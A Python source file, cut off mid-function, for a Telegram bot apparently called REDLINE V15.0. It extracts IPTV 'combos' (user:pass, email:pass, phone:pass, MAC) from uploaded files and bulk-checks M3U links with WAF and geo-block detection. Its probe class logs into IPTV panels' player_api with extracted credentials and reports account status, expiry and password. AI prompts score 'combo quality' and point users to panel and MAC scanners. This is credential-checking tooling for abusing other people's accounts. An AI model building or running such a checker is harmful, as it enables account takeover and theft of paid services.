#!/usr/bin/env python3
"""
REDLINE V15.0 ENHANCED Telegram Bot
Complete extraction bot with M3U Checker & Converters
Tier 1 Features: All extractions + M3U tools + Progress tracking

Author: Based on REDLINE V15.0
Bot Version: 3.0 (Complete)
"""

import os
import re
import logging
import asyncio
import time
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from typing import List, Set, Tuple, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import telegram
from telegram.constants import ChatAction

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import google.generativeai as genai
    HAS_GEMINI = True
except ImportError:
    HAS_GEMINI = False

try:
    from openai import OpenAI
    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

# ============================================
# AI ASSISTANT (Dual AI: Gemini + Perplexity)
# ============================================

class GeminiAI:
    """AI-powered features using Google Gemini"""
    
    def __init__(self, api_key: str = None):
        self.api_key = api_key or os.environ.get('GEMINI_API_KEY')
        self.enabled = False
        self.model = None
        
        if HAS_GEMINI and self.api_key:
            try:
                genai.configure(api_key=self.api_key)
                self.model = genai.GenerativeModel('gemini-pro')
                self.enabled = True
            except Exception as e:
                self.enabled = False
        elif not HAS_GEMINI:
            self.enabled = False
        else:
            self.enabled = False
    
    async def chat(self, question: str, context: str = "") -> str:
        """Chat with AI assistant"""
        if not self.enabled:
            return "🤖 AI Support is not available. Please contact administrator."
        
        try:
            prompt = f"{context}\n\nUser question: {question}" if context else question
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt
            )
            return response.text
        except Exception as e:
            return f"❌ AI Error: {str(e)}"
    
    async def analyze_file(self, text: str, file_type: str = "combo") -> str:
        """Analyze file content with AI"""
        if not self.enabled:
            return "AI analysis not available"
        
        try:
            prompt = f"""Analyze this IPTV {file_type} file content and provide:
1. File type and format
2. Number of entries
3. Quality assessment
4. Any issues or recommendations

Content (first 2000 chars):
{text[:2000]}"""
            
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt
            )
            return response.text
        except Exception as e:
            return f"Analysis failed: {str(e)}"
    
    async def explain_combo(self, combo: str) -> str:
        """Explain what a combo is and how to use it"""
        if not self.enabled:
            return "AI explanation not available"
        
        try:
            prompt = f"""Explain this IPTV combo/credential in simple terms:
{combo}

Include:
- What type it is (M3U, U:P, M:P, MAC, etc.)
- How to use it
- What it's for"""
            
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt
            )
            return response.text
        except Exception as e:
            return f"Explanation failed: {str(e)}"
    
    async def smart_search(self, query: str, text: str) -> str:
        """AI-powered smart search"""
        if not self.enabled:
            return "AI search not available"
        
        try:
            prompt = f"""Search this IPTV data for: {query}

Data:
{text[:3000]}

Return only the relevant matches, one per line."""
            
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt
            )
            return response.text
        except Exception as e:
            return f"Search failed: {str(e)}"
    
    async def help_command(self, question: str) -> str:
        """Get help on bot features"""
        if not self.enabled:
            return "AI help not available"
        
        try:
            prompt = f"""You are an expert assistant for the REDLINE V15.0 IPTV bot.

Bot features:
- Extract combos: N:P (phone:pass), U:P (user:pass), M:P (email:pass), M3U links, MAC addresses
- Check M3U links automatically
- Convert between formats (M3U ↔ Combo, M3U ↔ MAC)
- Panel search and checking
- Keyword search in files
- StreamCreed finder
- WHOIS lookup

User question: {question}

Provide a helpful, concise answer."""
            
            response = await asyncio.to_thread(
                self.model.generate_content,
                prompt
            )
            return response.text
        except Exception as e:
            return f"Help failed: {str(e)}"

class PerplexityAI:
    """Search-enhanced AI using Perplexity"""
    
    def __init__(self, api_key: str = None):
        self.api_key = api_key or os.environ.get('PERPLEXITY_API_KEY')
        self.enabled = False
        self.client = None
        
        if HAS_OPENAI and self.api_key:
            try:
                self.client = OpenAI(
                    api_key=self.api_key,
                    base_url="https://api.perplexity.ai"
                )
                self.enabled = True
            except Exception:
                self.enabled = False
    
    async def search_chat(self, question: str) -> str:
        """Chat with search-enhanced AI"""
        if not self.enabled:
            return None
        
        try:
            response = await asyncio.to_thread(
                self.client.chat.completions.create,
                model="llama-3.1-sonar-small-128k-online",
                messages=[
                    {
                        "role": "system",
                        "content": "You are an expert IPTV assistant with real-time search capabilities. Provide accurate, up-to-date information."
                    },
                    {
                        "role": "user",
                        "content": question
                    }
                ]
            )
            return response.choices[0].message.content
        except Exception:
            return None

class ChatGPTAI:
    """OpenAI ChatGPT for balanced AI tasks"""
    
    def __init__(self, api_key: str = None):
        self.api_key = api_key or os.environ.get('OPENAI_API_KEY')
        self.enabled = False
        self.client = None
        
        if HAS_OPENAI and self.api_key:
            try:
                self.client = OpenAI(api_key=self.api_key)
                self.enabled = True
            except Exception:
                self.enabled = False
    
    async def chat(self, question: str, context: str = "") -> str:
        """Chat with GPT-4o-mini"""
        if not self.enabled:
            return None
        
        try:
            messages = [
                {"role": "system", "content": "You are an expert IPTV assistant. Be concise and helpful."}
            ]
            if context:
                messages.append({"role": "system", "content": context})
            messages.append({"role": "user", "content": question})
            
            response = await asyncio.to_thread(
                self.client.chat.completions.create,
                model="gpt-4o-mini",
                messages=messages,
                max_tokens=500
            )
            return response.choices[0].message.content
        except Exception:
            return None
    
    async def analyze_file(self, text: str) -> str:
        """Quick file analysis"""
        if not self.enabled:
            return None
        
        try:
            response = await asyncio.to_thread(
                self.client.chat.completions.create,
                model="gpt-4o-mini",
                messages=[
                    {"role": "system", "content": "You are a file analyzer. Be very concise."},
                    {"role": "user", "content": f"Analyze this IPTV file sample:\n{text[:1000]}"}
                ],
                max_tokens=300
            )
            return response.choices[0].message.content
        except Exception:
            return None

class TripleAI:
    """AI Support powered by Google Gemini"""
    
    def __init__(self):
        self.gemini = GeminiAI()
        # Paid APIs disabled to avoid charges
        self.perplexity = None  # Would charge after $5/month
        self.chatgpt = None     # Separate billing from GO plan
        self.enabled = self.gemini.enabled
    
    async def chat(self, question: str, context: str = "") -> str:
        """AI-powered chat support"""
        if self.gemini.enabled:
            result = await self.gemini.chat(question, context)
            if result:
                return result
        
        return "🤖 AI Support is temporarily unavailable."
    
    async def analyze_file(self, text: str, file_type: str = "combo") -> str:
        """AI-powered file analysis"""
        if self.gemini.enabled:
            result = await self.gemini.analyze_file(text, file_type)
            if result:
                return result
        
        return "AI analysis not available"
    
    async def explain_combo(self, combo: str) -> str:
        """AI-powered combo explanation"""
        if self.gemini.enabled:
            result = await self.gemini.explain_combo(combo)
            if result:
                return result
        
        return "AI explanation not available"
    
    async def help_command(self, question: str) -> str:
        """AI-powered help support"""
        if self.gemini.enabled:
            result = await self.gemini.help_command(question)
            if result:
                return result
        
        return "AI help not available"
    
    def get_status(self) -> str:
        """Get AI status"""
        if self.gemini.enabled:
            return "✅ AI Support"
        return "❌ Disabled"
    
    # === SMART FEATURES (CACHED TO SAVE API CALLS) ===
    
    _file_type_cache = {}  # Cache file type detection
    _quality_cache = {}    # Cache quality scores
    
    async def detect_file_type(self, text_sample: str) -> dict:
        """Auto-detect file type (AI-powered)"""
        # Cached for performance
        if not self.gemini.enabled:
            return {"type": "unknown", "confidence": 0}
        
        # Use only first 500 chars to save tokens
        sample = text_sample[:500]
        cache_key = hash(sample)
        
        # Check cache first
        if cache_key in self._file_type_cache:
            return self._file_type_cache[cache_key]
        
        try:
            prompt = f"""Analyze this file sample and detect type. Return ONLY a JSON object:
{{"type": "up", "confidence": 0-100}}

Types: up (user:pass), mp (email:pass), np (phone:pass), m3u (playlist), mac (MAC addresses), mixed

Sample:
{sample}"""
            
            response = await asyncio.to_thread(
                self.gemini.model.generate_content,
                prompt
            )
            
            # Parse response
            import json
            result = json.loads(response.text.strip('```json\n').strip('```').strip())
            
            # Cache result
            self._file_type_cache[cache_key] = result
            return result
        except Exception:
            return {"type": "unknown", "confidence": 0}
    
    async def score_quality(self, combos: list, sample_size: int = 5) -> dict:
        """Score combo quality (AI-powered)"""
        # Cached for performance, samples 5 combos only
        if not self.gemini.enabled or not combos:
            return {"overall": 0, "advice": ""}
        
        # Only check FIRST 5 combos to save API calls
        sample = combos[:sample_size]
        cache_key = hash(str(sample))
        
        # Check cache
        if cache_key in self._quality_cache:
            return self._quality_cache[cache_key]
        
        try:
            prompt = f"""Rate these IPTV combos quality 0-100. Return ONLY JSON:
{{"overall": 0-100, "advice": "short tip"}}

Combos:
{chr(10).join(sample)}"""
            
            response = await asyncio.to_thread(
                self.gemini.model.generate_content,
                prompt
            )
            
            import json
            result = json.loads(response.text.strip('```json\n').strip('```').strip())
            
            # Cache result
            self._quality_cache[cache_key] = result
            return result
        except Exception:
            return {"overall": 50, "advice": ""}
    
    async def recommend_action(self, file_type: str, count: int) -> str:
        """Recommend next action (SIMPLE - no API call needed for common cases)"""
        # Hardcoded recommendations to save API calls
        recommendations = {
            "up": f"✅ Found {count} U:P combos\n\n🤖 Recommended:\n• Use 'Quick U:P Check' to verify\n• Or convert to M3U playlist",
            "mp": f"✅ Found {count} M:P combos\n\n🤖 Recommended:\n• Check for panel credentials\n• Use 'Panel Searcher' to find servers",
            "np": f"✅ Found {count} N:P combos\n\n🤖 Recommended:\n• Verify phone numbers\n• Check password strength",
            "m3u": f"✅ Found {count} M3U links\n\n🤖 Recommended:\n• Use 'Auto Check M3U' to verify\n• Check channel availability",
            "mac": f"✅ Found {count} MAC addresses\n\n🤖 Recommended:\n• Use 'MAC Scanner' to test\n• Verify host compatibility"
        }
        
        return recommendations.get(file_type, f"✅ Found {count} items")
    
    async def analyze_whois(self, whois_report: str, target: str) -> str:
        """Analyze WHOIS data and provide AI trust assessment"""
        if not self.gemini.enabled:
            return ""
        
        try:
            # Use only first 2000 chars to save tokens
            report_sample = whois_report[:2000]
            
            prompt = f"""Analyze this WHOIS/domain data and provide a concise trust assessment.

Target: {target}

WHOIS Data:
{report_sample}

Provide ONLY:
1. Trust Score (0-100)
2. Key findings (3-4 bullet points)
3. One-line recommendation

Format as:
📊 Trust Score: XX/100
Key Findings:
• [finding 1]
• [finding 2]
• [finding 3]
💡 Recommendation: [one line]

Be concise and focus on IPTV/hosting quality indicators."""
            
            response = await asyncio.to_thread(
                self.gemini.model.generate_content,
                prompt
            )
            
            analysis = response.text.strip()
            
            # Add emoji indicators based on content
            if "trust" in analysis.lower() or "legitimate" in analysis.lower():
                return f"🤖 AI Trust Analysis:\n{analysis}"
            else:
                return f"🤖 AI Analysis:\n{analysis}"
                
        except Exception:
            return ""
    
    async def analyze_error(self, error_msg: str) -> str:
        """Quick error analysis (CACHED)"""
        # Simple pattern matching - no API call for common errors
        error_lower = error_msg.lower()
        
        if "timeout" in error_lower or "timed out" in error_lower:
            return "🤖 Server not responding. Try:\n• Check internet connection\n• Server might be down\n• Try again in few minutes"
        elif "403" in error_lower or "forbidden" in error_lower:
            return "🤖 Access denied. Try:\n• Server blocks your region\n• Use proxy/VPN\n• Credentials might be wrong"
        elif "404" in error_lower:
            return "🤖 Not found. Try:\n• Check URL spelling\n• Server might have moved\n• Contact provider"
        elif "connection" in error_lower:
            return "🤖 Connection issue. Try:\n• Check internet\n• Server might be offline\n• Try different time"
        else:
            return "🤖 Unexpected error. Try:\n• Check file format\n• Reduce file size\n• Contact support"

# ============================================
# HELPER UTILITIES (Progress Tracking & Caching)
# ============================================

class ProgressTracker:
    """Real-time progress updates for long operations"""
    
    def __init__(self, message, total: int, operation: str = "Processing"):
        self.message = message
        self.total = total
        self.current = 0
        self.operation = operation
        self.last_update = 0
        self.update_interval = 2.0  # Update every 2 seconds
        self.start_time = time.time()
        
    async def update(self, current: int, force: bool = False):
        """Update progress (throttled to avoid API rate limits)"""
        self.current = current
        now = time.time()
        
        # Only update if enough time passed or forced
        if not force and (now - self.last_update) < self.update_interval:
            return
            
        self.last_update = now
        percent = (current / self.total) * 100 if self.total > 0 else 0
        
        # Progress bar (20 chars)
        filled = int(percent / 5)
        bar = '█' * filled + '░' * (20 - filled)
        
        # ETA calculation
        elapsed = now - self.start_time
        if current > 0:
            rate = current / elapsed
            remaining = (self.total - current) / rate if rate > 0 else 0
            eta = f"{int(remaining)}s" if remaining < 60 else f"{int(remaining/60)}m"
        else:
            eta = "calculating..."
        
        try:
            await self.message.edit_text(
                f"⏳ <b>{self.operation}</b>\n\n"
                f"[{bar}] {percent:.1f}%\n\n"
                f"📊 {current:,} / {self.total:,} items\n"
                f"⏱️ ETA: {eta}",
                parse_mode='HTML'
            )
        except Exception:
            # Ignore rate limit errors on progress updates
            pass
    
    async def complete(self, result_summary: str = ""):
        """Mark operation as complete"""
        elapsed = time.time() - self.start_time
        minutes = int(elapsed / 60)
        seconds = int(elapsed % 60)
        time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
        
        try:
            await self.message.edit_text(
                f"✅ <b>{self.operation} Complete!</b>\n\n"
                f"📊 Processed: {self.total:,} items\n"
                f"⏱️ Time: {time_str}\n"
                f"{result_summary}",
                parse_mode='HTML'
            )
        except Exception:
            pass


class SimpleCache:
    """Simple in-memory cache with TTL"""
    
    def __init__(self, ttl: int = 3600):
        self.cache = {}
        self.ttl = ttl
    
    def get(self, key: str):
        """Get cached value if not expired"""
        if key in self.cache:
            value, timestamp = self.cache[key]
            if time.time() - timestamp < self.ttl:
                return value
            else:
                del self.cache[key]
        return None
    
    def set(self, key: str, value):
        """Cache value with current timestamp"""
        self.cache[key] = (value, time.time())
    
    def clear_expired(self):
        """Remove expired entries"""
        now = time.time()
        expired = [k for k, (_, ts) in self.cache.items() if now - ts > self.ttl]
        for k in expired:
            del self.cache[k]


def format_number(num: int) -> str:
    """Format large numbers with K/M suffixes"""
    if num < 1000:
        return str(num)
    elif num < 1000000:
        return f"{num/1000:.1f}K"
    else:
        return f"{num/1000000:.1f}M"


def format_file_size(size_bytes: int) -> str:
    """Format bytes to human-readable size"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024:
            return f"{size_bytes:.1f}{unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f}TB"


def count_lines_efficient(file_path: str, max_lines: int = None) -> int:
    """Count lines in file efficiently without loading into memory"""
    count = 0
    with open(file_path, 'rb') as f:
        for _ in f:
            count += 1
            if max_lines and count > max_lines:
                return count
    return count


def read_file_chunked(file_path: str, max_lines: int = None):
    """Generator to read large files line by line (memory efficient)"""
    count = 0
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if max_lines and count >= max_lines:
                break
            yield line
            count += 1

# ============================================
# BOT CONFIGURATION
# ============================================

# Read sensitive values from environment variables
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN env var is required")

# Logging configuration
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Suppress verbose third-party logs
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('httpcore').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
logging.getLogger('telegram.ext').setLevel(logging.INFO)  # Keep Application logs
logging.getLogger('apscheduler').setLevel(logging.WARNING)  # Reduce scheduler noise

# Temp directory for file processing
TEMP_DIR = 'bot_temp'
os.makedirs(TEMP_DIR, exist_ok=True)

# File size limits (Koyeb-optimized)
MAX_FILE_SIZE = int(os.environ.get('MAX_FILE_SIZE', 50 * 1024 * 1024))  # 50MB default
MAX_LINES = int(os.environ.get('MAX_LINES', 500000))  # 500K lines max
MAX_MEMORY_MB = int(os.environ.get('MAX_MEMORY_MB', 300))  # 300MB RAM limit

# Performance settings
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '8'))  # Reduced for Koyeb
PROCESSING_TIMEOUT = 300  # 5 minutes max per operation

# Initialize global cache (1 hour TTL)
m3u_cache = SimpleCache(ttl=3600)
result_cache = SimpleCache(ttl=1800)  # 30 min for results

# Proxy configuration (optional)
# Set to None to disable proxy, or provide proxy dict
# HTTP Proxy Example: 
#   PROXY_CONFIG = {'http': 'http://proxy:port', 'https': 'http://proxy:port'}
# SOCKS5 Proxy Example (requires: pip install requests[socks]):
#   PROXY_CONFIG = {'http': 'socks5://proxy:port', 'https': 'socks5://proxy:port'}
PROXY_CONFIG = None  # legacy, overridden by settings if enabled

# ============================================
# ACCESS CONTROL CONFIG
# ============================================
# Allow posting only from these channels; use env CHANNEL_IDS or CHANNEL_ID
_chan_env = (os.environ.get('CHANNEL_IDS') or os.environ.get('CHANNEL_ID') or '').strip()
_chan_list = _chan_env.split(',') if _chan_env else []
ALLOWED_CHANNEL_IDS = set()
for _c in _chan_list:
    _c = _c.strip()
    if not _c:
        continue
    try:
        ALLOWED_CHANNEL_IDS.add(int(_c))
    except Exception:
        # supports "-100..." strings too
        try:
            ALLOWED_CHANNEL_IDS.add(int(_c))
        except Exception:
            pass

# Owner allowlist (comma-separated numeric IDs via env OWNER_IDS)
_owner_env = os.environ.get('OWNER_IDS', '').strip()
OWNER_IDS = set()
if _owner_env:
    for s in _owner_env.split(','):
        s = s.strip()
        if not s:
            continue
        try:
            OWNER_IDS.add(int(s))
        except Exception:
            pass

# ============================================
# SETTINGS (persistent)
# ============================================

SETTINGS_PATH = os.path.join(TEMP_DIR, 'settings.json')
GLOBAL_SETTINGS = {
    'proxy_enabled': False,
    'proxy_value': '',
    'include_channels_auto': False,
    'workers': 12,
    'm3u_limit': 1000,
    'combo_limit': 500,
}

def load_settings():
    try:
        import json
        if os.path.exists(SETTINGS_PATH):
            with open(SETTINGS_PATH, 'r', encoding='utf-8') as f:
                data = json.load(f)
                GLOBAL_SETTINGS.update({k: data.get(k, v) for k, v in GLOBAL_SETTINGS.items()})
    except Exception:
        pass

def save_settings():
    try:
        import json
        with open(SETTINGS_PATH, 'w', encoding='utf-8') as f:
            json.dump(GLOBAL_SETTINGS, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def get_proxies() -> dict | None:
    if GLOBAL_SETTINGS.get('proxy_enabled') and GLOBAL_SETTINGS.get('proxy_value'):
        pv = GLOBAL_SETTINGS.get('proxy_value').strip()
        scheme = 'http' if pv.startswith(('http://','socks5://')) else 'http'
        return {'http': pv if '://' in pv else f'{scheme}://{pv}', 'https': pv if '://' in pv else f'{scheme}://{pv}'}
    return None

# ============================================
# INITIALIZE AI ASSISTANT
# ============================================

ai_assistant = TripleAI()
if ai_assistant.enabled:
    logger.info(f"🤖 AI Support initialized: {ai_assistant.get_status()}")
else:
    logger.info("🤖 AI Support disabled (install: pip install google-generativeai)")

load_settings()

# ============================================
# HTTP helper with retry
# ============================================
class Net:
    @staticmethod
    def get(url: str, timeout: int = 8, proxies: dict | None = None, headers: dict | None = None, allow_redirects: bool = True, stream: bool = False, retries: int = 2, backoff: float = 0.5):
        if not HAS_REQUESTS:
            raise RuntimeError('requests not installed')
        last_exc = None
        for i in range(retries + 1):
            try:
                return requests.get(url, timeout=timeout, proxies=proxies, headers=headers, allow_redirects=allow_redirects, stream=stream)
            except Exception as e:
                last_exc = e
                if i < retries:
                    time.sleep(backoff * (2 ** i))
        raise last_exc

# ============================================
# ACCESS CONTROL: CHANNEL-ONLY GUARD
# ============================================

def allowed_chat(update: Update) -> bool:
    try:
        chat = update.effective_chat
        if not chat:
            return False
        # Channel posts must be from allowed channels
        if chat.type == 'channel':
            try:
                return int(chat.id) in ALLOWED_CHANNEL_IDS
            except Exception:
                return False
        # Allow groups/supergroups only if their chat.id is explicitly whitelisted
        if chat.type in ('group', 'supergroup'):
            try:
                return int(chat.id) in ALLOWED_CHANNEL_IDS
            except Exception:
                return False
        # Private chats only from owners
        if chat.type == 'private':
            user = update.effective_user
            if user:
                try:
                    return int(user.id) in OWNER_IDS
                except Exception:
                    return False
            return False
        # Everything else denied
        return False
    except Exception:
        return False

# ============================================
# RATE LIMITER
# ============================================

_rate_state: Dict[int, Tuple[float, float]] = {}
_rate_warnings: Dict[int, float] = {}

def _allow_rate(chat_id: int, rate: float = 1.0, burst: int = 3) -> bool:
    """Token bucket rate limiter with user warning"""
    now = time.time()
    last, tokens = _rate_state.get(chat_id, (now, float(burst)))
    tokens = min(burst, tokens + (now - last) * rate)
    if tokens >= 1.0:
        _rate_state[chat_id] = (now, tokens - 1.0)
        return True
    _rate_state[chat_id] = (now, tokens)
    return False

async def send_rate_limit_warning(update: Update):
    """Send one-time rate limit warning per user"""
    chat_id = update.effective_chat.id
    now = time.time()
    last_warn = _rate_warnings.get(chat_id, 0)
    if now - last_warn > 60:  # Once per minute
        _rate_warnings[chat_id] = now
        try:
            await update.message.reply_text(
                "⏱️ <b>Slow down!</b>\n\n"
                "Please wait a moment before sending more requests.",
                parse_mode='HTML'
            )
        except Exception:
            pass

# ============================================
# REDLINE V15.0 EXTRACTION ENGINE
# All extraction logic from your script
# ============================================

# ============================================
# M3U LINK CHECKER - TIER 1 FEATURE
# ============================================

class M3UChecker:
    """M3U Link Checker with multi-threaded validation"""
    
    @staticmethod
    def check_single_link(url: str, timeout: int = 5, proxies: dict = None) -> Tuple[str, bool, str]:
        """Check if M3U link is alive"""
        if not HAS_REQUESTS:
            return (url, False, "❌ requests not installed")
        
        try:
            response = requests.head(url, timeout=timeout, allow_redirects=True, proxies=proxies)
            
            if response.status_code == 200:
                return (url, True, "✅ ALIVE")
            elif response.status_code == 403:
                return (url, False, "🔒 FORBIDDEN")
            elif response.status_code == 404:
                return (url, False, "❌ NOT FOUND")
            else:
                return (url, False, f"⚠️ CODE {response.status_code}")
        except requests.exceptions.Timeout:
            return (url, False, "⏱️ TIMEOUT")
        except requests.exceptions.ConnectionError:
            return (url, False, "🔌 CONN ERROR")
        except Exception:
            return (url, False, "❌ ERROR")

    @staticmethod
    def categorize(url: str, timeout: int = 3, proxies: dict | None = None) -> Tuple[str, str]:
        """Enhanced categorize similar to REDLINE: returns (category, details)."""
        if not HAS_REQUESTS:
            return ("ERROR", "requests not installed")
        try:
            headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
            r = Net.get(url, timeout=timeout, allow_redirects=True, proxies=proxies, headers=headers, stream=True)
            status_code = r.status_code
            content = (r.text or "").lower()

            waf_ind = ["cloudflare", "akamai", "imperva", "incapsula", "sucuri", "ddos protection", "rate limit exceeded"]
            vpn_phrases = [
                "access denied", "blocked", "forbidden", "vpn access required",
                "not available in your region", "geo-blocked", "ip blocked"
            ]

            if any(p in content for p in vpn_phrases):
                return ("VPN_NEEDED", f"Geo/WAF block (HTTP {status_code})")
            if any(w in content for w in waf_ind) or status_code in (403, 429, 503):
                return ("WAF", f"WAF/Edge protection (HTTP {status_code})")
            if ("captcha" in content) or ("recaptcha" in content) or ("hcaptcha" in content):
                return ("CAPTCHA", f"CAPTCHA (HTTP {status_code})")
            # Simple valid fingerprint
            if status_code == 200 and any(s in content for s in ["xtream", "player_api", "login", "panel"]):
                return ("VALID", f"HTTP {status_code}")
            if status_code >= 200 and status_code < 400:
                return ("VALID", f"HTTP {status_code}")
            if status_code == 404:
                return ("INVALID", "404 Not Found")
            return ("ERROR", f"HTTP {status_code}")
        except requests.exceptions.Timeout:
            return ("TIMEOUT", "Request timed out")
        except requests.exceptions.SSLError:
            return ("ERROR", "SSL error")
        except requests.exceptions.ConnectionError as e:
            msg = str(e).lower()
            if "name or service not known" in msg or "dns" in msg:
                return ("DNS_ERROR", "DNS failure")
            return ("ERROR", "Connection error")
        except Exception as e:
            return ("ERROR", str(e)[:120])
    
    @staticmethod
    def check_links_batch(links: List[str], max_workers: int = 20, proxies: dict = None) -> Dict:
        """Check multiple links in parallel"""
        results = {'alive': [], 'dead': []}
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(M3UChecker.check_single_link, link, 5, proxies): link 
                      for link in links}
            
            for future in as_completed(futures):
                url, is_alive, status = future.result()
                if is_alive:
                    results['alive'].append((url, status))
                else:
                    results['dead'].append((url, status))
        
        return results
    
    @staticmethod
    async def check_links_batch_async(links: List[str], max_workers: int = 20, proxies: dict = None, progress_callback=None) -> Dict:
        """Check multiple links in parallel with async progress tracking"""
        results = {'alive': [], 'dead': []}
        processed = 0
        
        def check_with_progress(link):
            result = M3UChecker.check_single_link(link, 5, proxies)
            return result
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_with_progress, link): link for link in links}
            
            for future in as_completed(futures):
                url, is_alive, status = future.result()
                if is_alive:
                    results['alive'].append((url, status))
                else:
                    results['dead'].append((url, status))
                
                processed += 1
                if progress_callback and processed % 5 == 0:  # Update every 5 links
                    await progress_callback(processed)
        
        # Final update
        if progress_callback:
            await progress_callback(len(links))
        
        return results

# ============================================
# M3U PROBE (REDLINE-style info)
# ============================================

class M3UProbe:
    @staticmethod
    def _extract_creds(url: str) -> Tuple[str, str, str, str]:
        """Return (base, port, username, password) if found, else empty strings."""
        try:
            p = urlparse(url)
            base = f"{p.scheme}://{p.netloc}"
            port = str(p.port or (443 if p.scheme == 'https' else 80))
            q = parse_qs(p.query)
            u = (q.get('username') or [None])[0]
            pw = (q.get('password') or [None])[0]
            if not u or not pw:
                # try pattern in path
                m = re.search(r"username=([^&\s]+).*password=([^&\s]+)", url, re.IGNORECASE)
                if m:
                    u, pw = m.group(1), m.group(2)
            return base, port, (u or ''), (pw or '')
        except Exception:
            return '', '', '', ''

    @staticmethod
    def _api_url(base: str, username: str, password: str) -> str:
        return f"{base}/player_api.php?username={username}&password={password}"

    @staticmethod
    def probe(url: str, timeout: int = 8, proxies: dict | None = None) -> Tuple[bool, Dict, str]:
        """Query player_api and return structured info for formatting."""
        if not HAS_REQUESTS:
            return False, {}, "requests not installed"
        base, port, username, password = M3UProbe._extract_creds(url)
        if not (base and username and password):
            return False, {}, "credentials not found in URL"
        api = M3UProbe._api_url(base, username, password)
        try:
            r = Net.get(api, timeout=timeout, allow_redirects=True, proxies=proxies, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 200:
                return False, {}, f"HTTP {r.status_code}"
            data = r.json() if r.text.strip().startswith('{') else {}
        except Exception as e:
            return False, {}, str(e)

        user = data.get('user_info') or {}
        server = data.get('server_info') or {}
        status = user.get('status') or user.get('auth') or ''
        message = user.get('message') or ''
        active_cons = user.get('active_cons') or 0
        try:
            active_cons = int(active_cons)
        except Exception:
            active_cons = 0
        max_conn = user.get('max_connections') or server.get('max_connections') or 0
        try:
            max_conn = int(max_conn)
        except Exception:
            max_conn = 0
        tz = server.get('timezone') or ''
        srv_url = server.get('url') or urlparse(base).netloc.split(':')[0]
        srv_port = str(server.get('port') or port)
        created_str = user.get('created_at') or ''
        if not created_str and user.get('created_at_timestamp'):
            try:
                created_str = datetime.fromtimestamp(int(user['created_at_timestamp']), tz=timezone.utc).strftime('%Y-%m-%d')
            except Exception:
                created_str = ''
        exp_date = user.get('exp_date') or user.get('expirations_date') or ''
        exp_disp = ''
        days_left = ''
        if exp_date:
            try:
                exp_ts = int(exp_date)
                if exp_ts > 0:
                    exp_dt = datetime.fromtimestamp(exp_ts, tz=timezone.utc)
                    exp_disp = exp_dt.strftime('%Y-%m-%d')
                    days_left_val = (exp_dt - datetime.now(tz=timezone.utc)).days
                    days_left = str(days_left_val)
            except Exception:
                exp_disp = str(exp_date)
        info = {
            'timezone': tz or '-',
            'status': 'Active' if str(status).lower() == 'active' else (status or '-'),
            'active': active_cons,
            'max': max_conn,
            'base': base,
            'url': f"http://{srv_url}/",
            'port': srv_port,
            'username': username,
            'password': password,
            'created': created_str.split(' ')[0] if created_str else '-',
            'expires': exp_disp or '-',
            'days_left': days_left,
            'message': message,
            'm3u': f"{base}/get.php?username={username}&password={password}&type=m3u_plus",
            'api': api,
        }
        return True, info, ''

    @staticmethod
    def format_manual_block(info: Dict) -> str:
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        lines = []
        lines.append(now)
        lines.append("")
        lines.append("\u25cf\u25ba Server Info:")
        lines.append(f"\u25cf\u25ba Server Message: {info.get('message','')}")
        lines.append(f"\u25cf\u25ba Timezone: {info.get('timezone','-')}")
        lines.append(f"\u25cf\u25ba Status: {info.get('status','-')}")
        lines.append(f"\u25cf\u25ba Active Connections: {info.get('active',0)}")
        lines.append(f"\u25cf\u25ba Max Connections: {info.get('max',0)}")
        lines.append(f"\u25cf\u25ba URL: {info.get('url','-')}")
        lines.append(f"\u25cf\u25ba Port: {info.get('port','-')}")
        lines.append(f"\u25cf\u25ba Username: {info.get('username','-')}")
        lines.append(f"\u25cf\u25ba Password: {info.get('password','-')}")
        lines.append(f"\u25cf\u25ba Created: {info.get('created','-')}")
        exp = info.get('expires','-')
        days = info.get('days_left')
        exp_line = f"\u25cf\u25ba Expires: {exp}"
        if days:
            exp_line += f" - {days} Days left"
        lines.append(exp_line)
        ch = info.get('channels')
        if ch:
            lines.append(f"\u26A0\uFE0F Content Channels: \u25ba {ch} \u25c4")
        else:
            lines.append(f"\u26A0\uFE0F Content Channels: ")
        lines.append(f"\u25cf\u25ba M3U: {info.get('m3u','-')}")
        lines.append("----------------------------")
        return "\n".join(lines)
    
    @staticmethod
    def format_auto_block(info: Dict) -> str:
        """Format info for auto batch processing"""
        lines = []
        lines.append("----------------------------")
        lines.append(f" Timezone: {info.get('timezone','-')}")
        lines.append(f" Status: {info.get('status','-')}")
        lines.append(f" Active Connections: {info.get('active',0)}")
        lines.append(f" Max Connections: {info.get('max',0)}")
        lines.append(f" URL: {info.get('url','-')}")
        lines.append(f" Port: {info.get('port','-')}")
        lines.append(f" Username: {info.get('username','-')}")
        lines.append(f" Password: {info.get('password','-')}")
